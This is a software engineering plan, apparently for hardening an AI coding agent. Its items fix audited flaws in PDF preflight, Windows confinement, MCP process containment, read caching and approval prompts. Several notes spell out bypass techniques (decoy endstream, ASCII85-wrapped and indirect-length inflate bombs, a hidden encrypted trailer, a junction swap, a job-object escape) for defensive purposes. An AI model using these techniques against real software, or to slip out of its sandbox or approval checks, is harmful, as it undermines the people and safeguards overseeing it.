**Approach (assumed at the header base):** Add the field in `internal/domain/hooks.go`; fill it where `internal/agent/loop.go` builds `ToolDef`s. Every other `ToolDef` literal (test doubles) keeps compiling via the zero value.
**Files:** internal/domain/hooks.go, internal/agent/loop.go, internal/agent/writedetection_test.go
**Read first:** internal/domain/hooks.go — ToolDef struct; internal/domain/tools.go — IsReadOnly; internal/agent/loop.go — toolMenu (~1624, ~1642); internal/tools/console_read.go, console_close.go — ReadOnly(); internal/agent/writedetection_test.go
**Tests:** `go test -race -count=1 -run 'ReadOnly|WriteDetection' ./internal/agent/`; `internal/agent/planmenu_test.go`'s `TestPlanAdmitsTheReadOnlyHalfOfTheConsoleFamily` already pins the console split and must still pass.
**Acceptance:** `go build ./... && go test -race -count=1 ./internal/agent/ && go test -race -count=1 ./internal/domain/`
**Commit:** `feat(domain): tool definitions carry the read-only bit`

## 10. Read cache is invalidated by any non-read-only call — ✅ DONE (2026-09-26)

NOTES (2026-09-26): a non-read-only call in the same assistant message as the last read counts as after it (matching the existing write-since comparison); a tool the menu does not list invalidates too, per the Goal.
NOTES (2026-09-26): consequential edit — internal/floor/toolnames.go: made necessary by the new invalidatesReadCache predicate (isFileMutatingTool's comment now names the wider read-cache question it deliberately does not answer); the plan's Approach names these comments but Files omits the path.
NOTES (2026-09-26): consequential edit — internal/floor/doc.go: made necessary by readcache.go's changed invalidation (the file's one-line summary said "not written since").
NOTES (2026-09-26): consequential edit — internal/config/config.go: made necessary by readcache.go's changed invalidation (the ReadCache field comment said "not written since").
NOTES (2026-09-26): internal/config/options.go and the registry.go /settings Desc still read "unchanged since apogee last read it" — left untouched as still true (the fix makes it truer) and user-visible text outside the item's Files.

**What:** Depends on item 9. Fixes the audit's High "Read cache serves stale content after a shell command rewrites a file".
**Goal:** after a successful read of a path, any later call to a tool whose `ToolDef.ReadOnly` is false (or that is unknown to the view) makes the next read of that path return full content, not the capped header; calls to read-only tools (`grep`, `list_dir`, `git_status`) keep the cache.
**Approach (assumed at the header base):** In `priorSuccessfulReadUnchanged` (`internal/floor/readcache.go`) add a separate predicate (do not widen `isFileMutatingTool`, which loopbreak/intent/tooluse share) that treats any non-read-only, non-read call after the last read as invalidating. Update `CONTEXT.md` "not written since", ADR 0071 row `cached_content_intercept`, `docs/manual/configuration.md` "unchanged since apogee last read it", and the `CacheRead`/`toolnames.go` comments.
**Files:** internal/floor/readcache.go, internal/floor/readcache_test.go, internal/agent/floorguards_test.go, CONTEXT.md, docs/adr/0071-*.md, docs/manual/configuration.md
**Read first:** internal/floor/readcache.go — CacheRead, priorSuccessfulReadUnchanged; internal/floor/toolnames.go — isFileMutatingTool, isReadTool (must NOT change); internal/agent/floorguards_test.go — TestFloorGuard_ReadCacheCapsAnUnchangedReRead; internal/agent/statemachine_test.go — fakeTool
**Tests:** `go test -race -count=1 -run ReadCache ./internal/floor/ ./internal/agent/` — read, `terminal` call, read again → full content.
**Acceptance:** `go test -race -count=1 ./internal/floor/ && go test -race -count=1 ./internal/agent/`
**Commit:** `fix(floor): read cache yields after any non-read-only tool call`

## 11. PDF preflight charges by /Length and the ordered /Filter list — ✅ DONE (2026-09-27)

NOTES (2026-09-27): deviation from the Goal's "`N G R` resolved through the raw object index": an indirect `/Length` is never looked up in the raw bytes. It is charged from the body start through EOF. The parser resolves the reference through the xref, and a hostile xref can point object N at a definition the raw scan never sees (inside another stream's body, or compressed in an ObjStm), while a raw lookup would use a decoy. So even the regression guard's closed-extent ordering rule can be bypassed. Charging through EOF bounds every length the parser could resolve, and legitimate streams are unaffected because zlib stops at its own end-of-data marker. The fourth fixture (a decoy `7 0 obj 10` inside an earlier, still-unresolved stream's body, with the bomb on `/Length 7 0 R`) is refused.
NOTES (2026-09-27): deviation from "unresolvable → charge the span to the object's endobj, clamped to EOF": an unresolvable length is charged through EOF instead. A literal `endobj` inside the body can be forged exactly as `endstream` could, and the EOF span covers the endobj span.
NOTES (2026-09-27): withoutStreamBodies skips each body only to the SHORTER of its direct `/Length` end and its first literal `endstream` (literal only when the length is not direct). So neither a long `/Length` nor a decoy can hide more text from the /Size, /Columns and /Contents scans than the old literal match did. Every `stream` keyword is also located for charging, including nested ones and a lone-CR end-of-line, and a stream with no `endstream` is charged as well; the old regex skipped all of these.
NOTES (2026-09-27): the stream dictionary is read by a small lexer that mirrors lex.go (comments, literal and hex strings, nested dictionaries and arrays, `N G R`, last duplicate key wins). The owner is the nearest `N G obj` header whose dictionary reads right up to the keyword, trying at most 8 headers. When none reads, the nearest header's stream is charged for the worst of [FlateDecode] and [ASCII85Decode, FlateDecode] through EOF, and so is an indirect `/Filter` or array member.
NOTES (2026-09-27): pre-existing, not fixed here: `chargesInflation` still reads `/Type`/`/Subtype` from the raw dictionary bytes with `pdfNameValue`, so a `% /Type /Image` comment ahead of the real `/Type /ObjStm` could exempt an object stream from the charge. The parsed dictionary now available could close this.
NOTES (2026-09-27): the doctext package takes ~77 s under -race on the Pi 5 (up from ~52 s), mostly from the four new 80 MiB bomb fixtures running in parallel.

**What:** Fixes the audit's High "PDF inflate-bomb guard can be bypassed two independent ways", plus the recon-found `/ASCII85Decode`-before-Flate bypass.
**Regression guard.** State the resolution order that keeps indirect-`/Length` lookups from reading header-shaped bytes inside an unresolved stream: resolve an indirect `/Length N G R` only against objects whose own extent a prior, conservative (literal-`endstream`) pass already closed; treat any forward or ambiguous reference as unresolvable and fall back to the `endobj`-clamped-to-EOF charge. Add a fourth fixture with an indirect `/Length` stream proving a decoy header planted inside an earlier, still-unresolved stream's body cannot understate it.
**Goal:** `preflightPDF` locates each stream body by its declared `/Length` (direct integer, or `N G R` resolved through the raw object index; unresolvable → charge the span to the object's `endobj`, clamped to EOF), and derives decode layers from the ordered `/Filter` name or array (`/FlateDecode` and `/ASCII85Decode` decoded in order); a decoy `endstream`, a doubled/commented `/FlateDecode`, and an ASCII85-wrapped bomb are all refused as inflate bombs.
**Approach (assumed at the header base):** In `internal/doctext/pdf.go` replace `pdfStreamBody`'s literal-`endstream` match and `countPDFNames(object.value, "FlateDecode")` (in `preflightPDF` and `chargesInflation`) with one shared locator + filter-list reader; `withoutStreamBodies` uses the same locator so `refuseAbsurdObjectCount`/`declaredIntegers`/`decodedReferences` keep seeing stream-free text. `inflatedSize` walks the layer list. Resolve an indirect `/Length N G R` only against objects whose extent a prior, conservative pass already closed; treat a forward or ambiguous reference as unresolvable.
**Files:** internal/doctext/pdf.go, internal/doctext/pdf_test.go
**Read first:** internal/doctext/pdf.go — preflightPDF, indexPDFObjects, pdfObjectHeaders, withoutStreamBodies; internal/doctext/pdf_test.go — TestExtractPDF_RefusesAnInflateBomb, hostilePDF
**Tests:** `go test -race -count=1 -run PDF ./internal/doctext/` — four new hostile fixtures (decoy endstream, doubled/commented FlateDecode, ASCII85-wrapped bomb, indirect `/Length N G R` reference); `TestExtractPDF_LeavesUndecodedStreamsUncharged` still passes.
**Acceptance:** `go test -race -count=1 ./internal/doctext/`
**Commit:** `fix(doctext): PDF preflight charges streams by /Length and the declared filter chain`

## 12. Encrypted PDFs are refused — ✅ DONE (2026-09-27)

NOTES (2026-09-27): `pdfEncrypted` runs two scans for `/Encrypt`, with the name decoded the way the lexer decodes it, so `#`-escapes count. The first covers every span outside stream bodies (`withoutStreamBodies`). The second runs from the lowest offset any `startxref` in the file's last 100 bytes names, through EOF. It is there because a hostile file can put its real trailer inside another stream's body and point startxref at it, which the first scan skips. A fixture shows the second scan is needed: with that scan disabled, the hidden-trailer case is read.
NOTES (2026-09-27): the standing "new tests fail pre-item" rule does not hold for one test. `TestExtractPDF_ReadsEncryptSpelledInsideAStreamAsContent` is a guard for the Goal's "unencrypted PDFs are unaffected" and passes on the pre-item tree by design. The four refusal cases all fail pre-item. Three of them pass straight through (the bomb case inflates 80 MiB in about 24 s and returns the scan message). The xref-stream case fails with the parser's own EOF error.
NOTES (2026-09-27): `TestExtractPDF_EncryptedFixtureOpensWithTheEmptyPassword` opens each encrypted fixture with `ledongthuc/pdf` directly and reads its text in the clear. It proves the fixtures really are encrypted and readable with the empty password (RC4, R2, 40-bit), which is the bypass this refusal closes.
NOTES (2026-09-27): consequential edit — docs/manual/commands.md: made necessary by the user-visible refusal of encrypted PDFs in `preflightPDF`. The @-reference paragraph now says an encrypted PDF is refused the same way a scanned one is.
NOTES (2026-09-27): known limit: `pdfNameSites` does not skip strings or comments, so an unencrypted PDF whose trailer region or other non-stream bytes spell `/Encrypt` inside a literal string or a comment is refused too. This is the same raw-scan limit the `/Size` and `/Columns` guards already have.

**What:** Depends on item 11 (same file). Fixes the recon-found empty-password-encryption bypass of the inflate budget.
**Goal:** reading a PDF whose trailer (or cross-reference stream dictionary) carries `/Encrypt` returns a refusal naming encryption as the reason; unencrypted PDFs are unaffected.
**Approach (assumed at the header base):** Check in `preflightPDF` before any stream is charged; wording follows the file's existing refusal messages.
**Files:** internal/doctext/pdf.go, internal/doctext/pdf_test.go
**Read first:** internal/doctext/pdf.go — preflightPDF, pdfUnreadableFormat, withoutStreamBodies, pdfNameSites; internal/doctext/pdf_test.go — hostilePDF, TestExtractPDF_RefusesAnAbsurdSizeInAnXrefStreamDictionary
**Tests:** `go test -race -count=1 -run 'PDF.*Encrypt' ./internal/doctext/`
**Acceptance:** `go test -race -count=1 ./internal/doctext/`
**Commit:** `fix(doctext): refuse encrypted PDFs the inflate preflight cannot charge`

## 13. ClearTree skips exactly what LabelTree skips — ✅ DONE (2026-09-27)

**What:** Fixes half of the audit's High "Windows confinement TOCTOU" (the `Info()`-error asymmetry).
**Goal:** a descendant whose `entry.Info()` fails is skipped by both `winlabel.LabelTree` and `winlabel.ClearTree`, via one shared pure decision helper with a table test that runs on every OS.
**Approach (assumed at the header base):** Extract the skip decision beside `descendantDecision`/`clearDescendantDecision` in `internal/platform/winlabel/sddl.go`; both walk callbacks in `walk_windows.go` call it.
**Files:** internal/platform/winlabel/sddl.go, internal/platform/winlabel/sddl_test.go, internal/platform/winlabel/walk_windows.go
**Read first:** internal/platform/winlabel/sddl.go — descendantDecision, clearDescendantDecision; internal/platform/winlabel/walk_windows.go — LabelTree (line 106), ClearTree (line 247); internal/platform/winlabel/sddl_test.go — TestLabelAndClearSkipTheSameDescendants
**Tests:** `go test -race -count=1 -run Skip ./internal/platform/winlabel/`
**Acceptance:** `go test -race -count=1 ./internal/platform/winlabel/ && GOOS=windows go vet ./internal/platform/...`
**Commit:** `fix(winlabel): clear pass skips a descendant whose info cannot be read`

## 14. Mandatory-label writes go through one reparse-checked handle

**What:** Depends on item 13. Fixes the audit's High "Windows confinement TOCTOU" (root swap between check and write).
**Regression guard.** `ReadSDDL`/`SetSDDL` keep their exported `(path string) (string, error)` / `(path, sddl string) error` signatures — only their internal implementation gains the reparse-checked handle — since `internal/platform/confiner_windows_test.go` calls them on that signature at roughly 66 sites; add it to Files. `Journal.stat` (`session.go`) stays the identity source `LabelTree` calls for the root and descendants — the merged handle may live behind it — so `walk_windows_test.go`'s `TestLabelTreeLabelsARootWhoseIdentityCannotBeRead` fault injection (`j.stat`) still observes a failure; add `session.go` to Files.
**Goal:** every mandatory-label read and write in `winlabel` (roots and descendants, in `LabelTree`, `ClearTree`, `revertJournal`) opens the object once with `FILE_FLAG_OPEN_REPARSE_POINT`, refuses it when the handle's attributes carry `FILE_ATTRIBUTE_REPARSE_POINT`, and reads/writes the SACL on that handle; a root that became a reparse point after `resolveBoxRoot` fails the label pass with an error (confinement unavailable, as ADR 0020 §6 already prescribes for an up-front reparse root). `ReadSDDL`/`SetSDDL` keep their existing exported signatures and `Journal.stat` stays the identity source `LabelTree` consults.
**Approach (assumed at the header base):** New helper in `walk_windows.go` using `windows.CreateFile(READ_CONTROL|WRITE_OWNER|FILE_READ_ATTRIBUTES, …, OPEN_REPARSE_POINT|BACKUP_SEMANTICS)` + `GetFileInformationByHandle` + `windows.GetSecurityInfo`/`SetSecurityInfo(SE_FILE_OBJECT, LABEL_SECURITY_INFORMATION)`; the merged handle lives behind `ReadSDDL`/`SetSDDL`'s unchanged signatures and behind `Journal.stat`, not in place of either. Stubs in `walk_other.go` for any new export. Update ADR 0020 §6 and the `SetSDDL`/`LabelTree`/`ClearTree`/`resolveBoxRoot` doc comments.
**Files:** internal/platform/winlabel/walk_windows.go, internal/platform/winlabel/walk_other.go, internal/platform/winlabel/walk_windows_test.go, internal/platform/winlabel/session.go, internal/platform/confiner_windows.go, internal/platform/confiner_windows_test.go, docs/adr/0020-*.md
**Read first:** internal/platform/winlabel/walk_windows.go — ReadSDDL, SetSDDL, statHandle; internal/platform/winlabel/session.go — Journal.stat, withIdentity; internal/platform/winlabel/walk_windows_test.go — TestLabelTreeLabelsARootWhoseIdentityCannotBeRead; internal/platform/confiner_windows_test.go — ReadSDDL/SetSDDL call sites (~66)
**Tests:** Windows-tagged test in `walk_windows_test.go`: a root replaced by a junction after resolution is refused and the junction target's SACL is unchanged (runs in the `test-windows` CI job); `TestLabelTreeLabelsARootWhoseIdentityCannotBeRead`'s `j.stat` fault injection still fails the identity read (unchanged call path); `internal/platform/confiner_windows_test.go` compiles unchanged against `ReadSDDL`/`SetSDDL`'s existing signatures.
**Acceptance:** `GOOS=windows go vet ./internal/platform/... && GOOS=windows go test -c -o /dev/null ./internal/platform/winlabel/ && go test -race -count=1 ./internal/platform/...`
**Commit:** `fix(winlabel): label reads and writes pin one reparse-checked handle`

## 15. MCP stdio server joins its teardown before the handshake

**What:** Fixes the audit's High "MCP stdio server's grandchild can escape the Windows Job Object".
**Regression guard.** Add `internal/platform/teardown_windows.go` to Files beside `teardown.go` — the "sub-millisecond window" known-gap comment this item updates lives at `teardown_windows.go:34-45`, not in `teardown.go`, which carries no such paragraph.
**Goal:** `stdioTransport.Connect` calls the transport's `platform.ProcessTeardown.Contain` immediately after `cmd.Start()` succeeds, before any handshake byte; a failed handshake reaps through the contained job; `connectOne` no longer calls `Contain` after the handshake.
**Approach (assumed at the header base):** Add a `td platform.ProcessTeardown` field to `stdioTransport` (`internal/mcp/transport.go`), set in `buildStdioTransport`. Portable test with a recording fake `ProcessTeardown` asserting Contain precedes the handshake on both success and failure. Fix the "sub-millisecond window" comment in `client.go` and the known-gap paragraph on `platform.NewProcessTeardown` at `internal/platform/teardown_windows.go:34-45`; update `docs/design/mcp-client.md`, `internal/mcp/doc.go`.
**Files:** internal/mcp/transport.go, internal/mcp/client.go, internal/mcp/mcp_test.go, internal/mcp/doc.go, internal/platform/teardown.go, internal/platform/teardown_windows.go, docs/design/mcp-client.md
**Read first:** internal/mcp/transport.go — stdioTransport, buildStdioTransport, Connect; internal/mcp/client.go — connectOne; internal/platform/teardown_windows.go — NewProcessTeardown (line 40); internal/mcp/mcp_test.go — TestBuildStdioTransport_CancelArmsTheCmdsTeardown
**Tests:** `go test -race -count=1 -run 'Contain|Teardown|Stdio' ./internal/mcp/`
**Acceptance:** `go test -race -count=1 ./internal/mcp/ && GOOS=windows go vet ./internal/mcp/ ./internal/platform/`
**Commit:** `fix(mcp): contain a stdio server's process tree before the handshake`

## 16. Discovery response bodies are byte-capped

**What:** Fixes the audit's High "Model/props discovery decodes an unbounded response body".
**Goal:** `discoverModels` and `discoverProps` read at most `maxResponseBodyBytes`; an oversized `/v1/models` body fails discovery with the existing decode error, an oversized `/props` body degrades to unknown values.
**Approach (assumed at the header base):** Wrap `resp.Body` in `io.LimitReader(resp.Body, maxResponseBodyBytes)` in both functions in `internal/provider/discovery.go`, mirroring `Respond`.
**Files:** internal/provider/discovery.go, internal/provider/discovery_test.go
**Read first:** internal/provider/discovery.go — discoverModels, discoverProps; internal/provider/client.go — maxResponseBodyBytes, Respond; internal/provider/client_test.go — TestRespond_BodyIsCapped
**Tests:** `go test -race -count=1 -run Discover ./internal/provider/` — pad bodies to `maxResponseBodyBytes+1` as `TestRespond_BodyIsCapped` does.
**Acceptance:** `go test -race -count=1 ./internal/provider/`
**Commit:** `fix(provider): cap model and props discovery bodies`

## 17. Live stream stripping is throttled on large replies

**What:** Fixes the audit's High "Streamed response processing rescans the whole accumulated buffer on every delta".
**Goal:** while streaming, once the accumulated reply exceeds 256 KiB, `emitVisibleDelta`/`emitReasoningDelta` re-run the stripper only after at least 64 KiB of new bytes since the last scan; below 256 KiB behaviour is byte-identical to today; the committed message is stripped from the full text exactly as before.
**Approach (assumed at the header base):** Track last-scanned length on the per-response streaming state in `internal/agent/loop.go`; skip `IsMidChannel`/`Strip` when throttled. Never touch the frozen oracle functions in `internal/processing`. Test with a counting stripper double: a 2 MiB reply in 1-byte deltas triggers ≤ (256 KiB + 2 MiB/64 KiB + small constant) strip calls, and the final message equals the unthrottled result.
**Files:** internal/agent/loop.go, internal/agent/streamsuppress_test.go
**Read first:** internal/agent/loop.go — streamResponse, emitVisibleDelta, emitReasoningDelta; internal/agent/collect.go — collectCompletion; internal/processing/parserfor.go — ContentStripper (Strip, IsMidChannel); internal/agent/streamsuppress_test.go — TestStream_NativeIsByteIdentical
**Tests:** `go test -race -count=1 -run 'Stream|Throttle' ./internal/agent/`
**Acceptance:** `go test -race -count=1 ./internal/agent/ && go test -race -count=1 ./internal/processing/`
**Commit:** `fix(agent): throttle live stream stripping on large replies`

## 18. Console output is capped while it accumulates

**What:** Fixes the audit's High "Console output has no size cap while it accumulates".
**Regression guard.** Keep `capConsoleOutput`'s real truncation for the `consoleTail`/`console_read` path unchanged — `console_read`'s `Execute` reads via a single `c.Read()` that can return up to `ringCapacity` (1 MiB, 4x `maxSubprocessOutputBytes`) and relies on that real cap to stay bounded. Only `collectConsoleWindow`'s own `CappedBuffer`-sourced output (`consoleWindowTail`/`consoleOpenTail`) skips the second capping. Add a >256 KiB single-read `console_read` case asserting it is still capped at `maxSubprocessOutputBytes`.
**Goal:** `collectConsoleWindow` never holds more than `maxSubprocessOutputBytes` of output in memory; it keeps draining until the window ends, counts the overflow, and the rendered result carries exactly one `… [output truncated: N more bytes]` marker. `consoleTail`/`console_read`'s single-read path keeps `capConsoleOutput`'s real truncation.
**Approach (assumed at the header base):** Collect into a `subprocess.CappedBuffer{Limit: maxSubprocessOutputBytes}` in `internal/tools/console_common.go`; make `consoleWindowTail`/`consoleOpenTail` (the `collectConsoleWindow` path) pass the buffer through rather than re-capping a string, while `consoleTail`'s single-`c.Read()` path keeps calling `capConsoleOutput`'s real truncation unchanged, since it is not sourced from the capped buffer.
**Files:** internal/tools/console_common.go, internal/tools/console_send_test.go, internal/tools/console_open_test.go, internal/tools/console_read_test.go
**Read first:** internal/tools/console_common.go — collectConsoleWindow, capConsoleOutput, renderConsoleTail, consoleTail; internal/tools/console_read.go — Execute; internal/console/ring.go — ringCapacity (1 MiB); internal/subprocess/subprocess.go — CappedBuffer
**Tests:** `go test -race -count=1 -run Console ./internal/tools/` — includes a >256 KiB single-read `console_read` case (`console_read_test.go`) asserting the result is still capped at `maxSubprocessOutputBytes`.
**Acceptance:** `go test -race -count=1 ./internal/tools/ && go test -race -count=1 ./internal/console/`
**Commit:** `fix(tools): bound console output during the wait window`

## 19. ask_user questions arm like approval panes

**What:** Fixes the audit's High "A keystroke queued before an ask_user question is drawn can silently submit it unread".
**Regression guard.** Add `internal/tui/mouse_test.go` to Files — `handleAskClick`'s own tests are not currently listed, though `mouse.go` is. Give `newAskModel` (and `askClickModel`) the same arm step `armApproval` already gives `newUnarmedApprovalModel`'s callers — an `armAsk` helper mirroring `armApproval` — and update every existing ask round-trip/click test that currently submits unarmed (`TestModelAskRoundTrip`, `TestModelAskChoicesRoundTrip`, `TestAskGivesTheBorrowedDraftBack`, the `TestModelAskMultiSelect*` round-trips, `TestAskClickHighlightsThenTheSecondClickSends`, `TestAskClickOnTheDefaultHighlightArmsAndSendsNothing`) the same way approval's own tests already do.
**Goal:** after `foldAskRequest`, ⏎ and a mouse click that submits are swallowed until the pane arms (drain-marker relay or the 2 s backstop, shared with approvals); esc, typed characters and multi-select ␣ stay live; a stale arm never arms a later pane.
**Approach (assumed at the header base):** Generalise the approval latch in `internal/tui/approval.go` (`approvalArmed`, `approvalSeq`, `foldInputDrained`, `foldApprovalArmed`, `approvalArmedMsg`) into a decision latch keyed to whichever of `pending`/`pendingAsk` is live; `foldAskRequest` returns the same `tea.Batch(marker, backstop tick)`; gate `case stateAwaitingAsk` Enter in `model.go` and `handleAskClick` in `mouse.go`. Mirror `TestModelApprovalKeysAreDeadUntilArmed` and its stale-arm siblings for ask. Add an `armAsk` helper mirroring `armApproval`, and update `newAskModel`/`askClickModel` and every existing ask round-trip/click test in `model_test.go` and `mouse_test.go` to arm before submitting, matching `armApproval(t, m)` in `TestApprovalClickHighlightsThenTheSecondClickRules`. Update `docs/manual/commands.md` arming sentence, `docs/layout/user-questions-layout.md`, and add an ask row beside T-13 in `docs/design/test-drivers.md`.
**Files:** internal/tui/ask.go, internal/tui/approval.go, internal/tui/model.go, internal/tui/mouse.go, internal/tui/model_test.go, internal/tui/mouse_test.go, docs/manual/commands.md, docs/layout/user-questions-layout.md, docs/design/test-drivers.md
**Read first:** internal/tui/model_test.go — newAskModel, armApproval, newUnarmedApprovalModel; internal/tui/mouse_test.go — askClickModel, approvalClickModel (arms first); internal/tui/approval.go — foldApprovalRequest, foldApprovalArmed; internal/tui/ask.go — foldAskRequest; internal/tui/mouse.go — handleAskClick, handleApprovalClick
**Tests:** `go test -race -count=1 -run 'Ask|Armed|Arm' ./internal/tui/` — includes `mouse_test.go`'s ask-click round trips, now armed via `armAsk`.
**Acceptance:** `go test -race -count=1 ./internal/tui/`
**Commit:** `fix(tui): an ask_user pane ignores enter until it is armed`

## 20. Advice ledger re-verifies the fence before trusting an offset

**What:** Fixes the audit's Critical "Persisted session record can silently carry truncated, garbled bytes" (not in the owner's tackle list; placed first among the remaining items by severity).
**Regression guard.** Invert both assertions that currently expect the ledger row to SURVIVE a rewrite that loses its fence: `internal/domain/hooks_test.go` (`TestConversationHasEngineNote`, "a longer body without the header", ~line 1026) and `internal/agent/stepnotice_test.go` (`TestStepNoticeIsToldAgainAfterAPruneStubbedIt`, "the noted result is stubbed") now expect the ledger EMPTY. Rewrite their doc comments (`hooks_test.go:995-1000`, `stepnotice_test.go:341-349`) and `HasEngineNote`'s own comment (`hooks.go:899-905`), all three of which currently document "the row survives `dropStaleAdvice`, only the header check tells the note is gone" as the shape this item deliberately reverses.
**Goal:** `Message.dropStaleAdvice` clears the advice ledger whenever the content at a span's offset no longer begins with that span's fence (`"\n\n"+AdviceFencePrefix+reaction+" ("` for advice, `"\n\n"+EngineNoteFencePrefix+topic+"]"` for engine notes); `recordContent` never slices at an unverified offset; a `"ok"` result later rewritten to a longer `[pruned: …]` stub persists the stub whole.
**Approach (assumed at the header base):** Put the check in `dropStaleAdvice` (`internal/domain/advice.go`); `Conversation.HasEngineNote`'s own re-check (`hooks.go`) may then be simplified. Invert `TestConversationHasEngineNote`'s "a longer body without the header" case and `TestStepNoticeIsToldAgainAfterAPruneStubbedIt`'s "the noted result is stubbed" case to expect an empty ledger, and rewrite the three doc comments (`hooks_test.go:995-1000`, `stepnotice_test.go:341-349`, `hooks.go:899-905`) that currently document the old "row survives" shape.
**Files:** internal/domain/advice.go, internal/domain/advice_test.go, internal/domain/hooks.go, internal/domain/hooks_test.go, internal/agent/stepnotice_test.go
**Read first:** internal/domain/advice.go — dropStaleAdvice, recordContent, AdviceSpan; internal/domain/hooks.go — HasEngineNote (comment, line 899-905); internal/domain/hooks_test.go — TestConversationHasEngineNote (case ~line 1026); internal/agent/stepnotice_test.go — TestStepNoticeIsToldAgainAfterAPruneStubbedIt
**Tests:** `go test -race -count=1 -run 'Advice|EngineNote|RecordContent' ./internal/domain/` && `go test -race -count=1 -run StepNotice ./internal/agent/` — both the "longer body without the header" and "the noted result is stubbed" cases now assert the ledger is empty.
**Acceptance:** `go test -race -count=1 ./internal/domain/ && go test -race -count=1 ./internal/agent/`
**Commit:** `fix(domain): drop the advice ledger when a rewrite loses its fence`

## 21. Blocking variant of the platform file lock

**What:**
**Goal:** `internal/platform` offers `AcquireLockWait(path string, timeout time.Duration) (release func(), err error)` that blocks up to `timeout` for the flock/`LockFileEx` lock and returns `*LockHeldError` on timeout; `AcquireLock` is unchanged.
**Approach (assumed at the header base):** Implement in `lock_unix.go`/`lock_windows.go` beside `AcquireLock` (a retry loop over the non-blocking call with a short sleep is acceptable).
**Files:** internal/platform/lock.go, internal/platform/lock_unix.go, internal/platform/lock_windows.go, internal/platform/lock_test.go
**Read first:** internal/platform/lock.go — AcquireLock, LockHeldError; internal/platform/lock_unix.go, lock_windows.go — lockFile, unlockFile; internal/platform/lock_test.go — TestAcquireLockRefusesASecondHolder
**Tests:** `go test -race -count=1 -run Lock ./internal/platform/`
**Acceptance:** `go test -race -count=1 ./internal/platform/ && GOOS=windows go vet ./internal/platform/`
**Commit:** `feat(platform): blocking file-lock acquisition with a timeout`

## 22. config.yaml writers serialise on a sidecar lock

**What:** Depends on item 21. Fixes the audit's High "Two apogee processes writing config.yaml at once can silently drop one writer's edit".
**Regression guard.** Update both `onlyFileIn` assertions (`internal/config/configedit_test.go:87`, `:177`) to also allow `config.yaml.lock` beside `config.yaml`, on both a successful seed-and-write and a refused edit. Keep the lock file un-removed on release: `internal/platform/lock.go:74-81` documents `AcquireLock`'s file as never removed, precisely what prevents the double-fire this item's `config.yaml.lock` sidecar relies on the same way — the item yields to that invariant rather than deleting the lock file to satisfy the old assertion.
**Goal:** `editFrom`, `migrateLegacyConfig` and the default-config seed each hold `<config path>.lock` (via `AcquireLockWait`, 5 s) from their read of `config.yaml` through its rename; two concurrent `SaveConfigSetting` calls on different keys both land; a timeout returns an error naming the config path.
**Approach (assumed at the header base):** One helper in `internal/config/configsplice.go` wraps the read-splice-verify-`writeConfigAtomically` sequence; every writer in `configwrite*.go`/`configmigrate.go` goes through it. The lock file is never removed, matching `AcquireLock`'s own invariant (`lock.go:74-81`) — update `onlyFileIn`'s two call sites (`configedit_test.go:87`, `:177`) to allow `config.yaml.lock` beside `config.yaml`. Mention the lock file in `docs/manual/configuration.md` where the config home is described.
**Files:** internal/config/configsplice.go, internal/config/configedit.go, internal/config/configmigrate.go, internal/config/defaults.go, internal/config/configedit_test.go, docs/manual/configuration.md
**Read first:** internal/config/configedit.go — edit, editFrom; internal/config/configsplice.go — writeConfigAtomically; internal/config/configedit_test.go — onlyFileIn (lines 87, 177); internal/platform/lock.go — AcquireLockWait, "NEVER removed" (74-81)
**Tests:** `go test -race -count=1 -run 'Concurrent|Lock|Edit' ./internal/config/` — two goroutines editing different keys, both keys present after; `onlyFileIn` now allows `config.yaml` plus `config.yaml.lock`.
**Acceptance:** `go test -race -count=1 ./internal/config/`
**Commit:** `fix(config): serialise config.yaml writers on a sidecar lock`

## 23. Whole-number YAML type for top-level count keys

**What:** Fixes part of the audit's High "A numeric-truncation guard built for one config key was never extended".
**Goal:** `delegate-max-steps`, `delegate-fanout-rounds`, `delegate-max-tokens`, `delegate-max-depth`, `re-stream-budget`, top-level `working-window`, `sessions.max-count` and `ui.tools-fold-over` refuse a non-`!!int` scalar (e.g. `2.5`, `32000.0`) at load with an error naming the value; each key's existing negative/zero handling is unchanged.
**Approach (assumed at the header base):** Add a shared `WholeCount` type in `internal/config/config.go` whose `UnmarshalYAML` refuses non-`!!int` tags (sign checks stay with each key's existing validator); use `*WholeCount` where absent must differ from 0. Update the `fileConfig`, `uiConfig`, `sessionsConfig` fields and their `internal/config/registry.go` accessors / `keyfield.go` readers. Copy `TestApplyConfigContextWindowRefusesAFractionOrANegative` per key.
**Files:** internal/config/config.go, internal/config/registry.go, internal/config/keyfield.go, internal/config/config_test.go
**Read first:** internal/config/config.go — TokenCount/UnmarshalYAML (pattern to mirror), fileConfig fields; internal/config/registry.go — intField, context-window row (734-738); internal/config/config_test.go — TestApplyConfigContextWindowRefusesAFractionOrANegative
**Tests:** `go test -race -count=1 -run 'Fraction|WholeCount' ./internal/config/`
**Acceptance:** `go build ./... && go test -race -count=1 ./internal/config/`
**Commit:** `fix(config): top-level count keys refuse a fractional value`

## 24. Server-entry count keys refuse fractions

**What:** Depends on item 23. Fixes the rest of the audit's High TokenCount-extension finding.
**Regression guard.** Add `cmd/apogee/wire_boot.go` to Files; convert at line 290 with `int(w.opts.StartupEntry.MaxOutputTokens)`, mirroring `wire_settings.go:250`'s `int(entry.ContextWindow)` pattern. Add `cmd/apogee/wire_firing_test.go` to Files; wrap the `entry.MaxOutputTokens` (line 220) and `entry.ParallelAgents` (line 239) reads in `int(...)`, as line 217 already does for `entry.ContextWindow`. Every doc clause in the Goal is either moved under the Approach or checked by a grep added to Acceptance: the `docs/manual/configuration.md` clause moves under the Approach below.
**Goal:** a server entry's `parallel-agents`, `working-window` and `max-output-tokens` refuse a non-`!!int` scalar at load; existing negative-value refusals are unchanged.
**Approach (assumed at the header base):** Retype the `ServerEntry` fields with `WholeCount`; convert at readers in `cmd/apogee` (`wire_boot.go`, `wire_server.go`, `upstream.go`, `delegation.go`, `wire_settings.go`, `wire_firing.go`, `probecontext.go`) — prefer an `Int()` accessor over scattering casts. `wire_boot.go:290`'s `w.cfg.Context.MaxOutputTokens = w.opts.StartupEntry.MaxOutputTokens` becomes `int(...)`, mirroring `wire_settings.go:250`; `wire_firing_test.go:220,239` wrap their `entry.*` comparisons in `int(...)`, as line 217 already does. Update `docs/manual/configuration.md` to state that these count keys also refuse a fraction.
**Files:** internal/config/config.go, internal/config/config_test.go, cmd/apogee/wire_boot.go, cmd/apogee/wire_server.go, cmd/apogee/wire_firing_test.go, cmd/apogee/upstream.go, cmd/apogee/delegation.go, cmd/apogee/wire_settings.go, cmd/apogee/wire_firing.go, cmd/apogee/probecontext.go, docs/manual/configuration.md
